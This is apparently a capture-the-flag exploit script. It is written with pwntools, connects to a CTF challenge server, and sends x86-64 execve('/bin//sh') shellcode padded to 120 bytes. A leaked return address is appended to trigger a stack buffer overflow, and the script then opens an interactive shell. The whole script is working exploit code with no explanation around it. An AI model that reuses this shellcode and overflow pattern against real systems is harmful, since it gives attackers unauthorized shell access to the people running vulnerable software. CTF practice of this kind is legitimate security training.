from pwn import *

ip = 'ctf.adl.tw'
port = 11000
r = remote(ip, port)

shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
shellcode += "a" * (120 - len(shellcode))

address = r.recv()
print("address: " + address)

shellcode += p64(int(address.decode(),16))

r.send(shellcode)
r.interactive()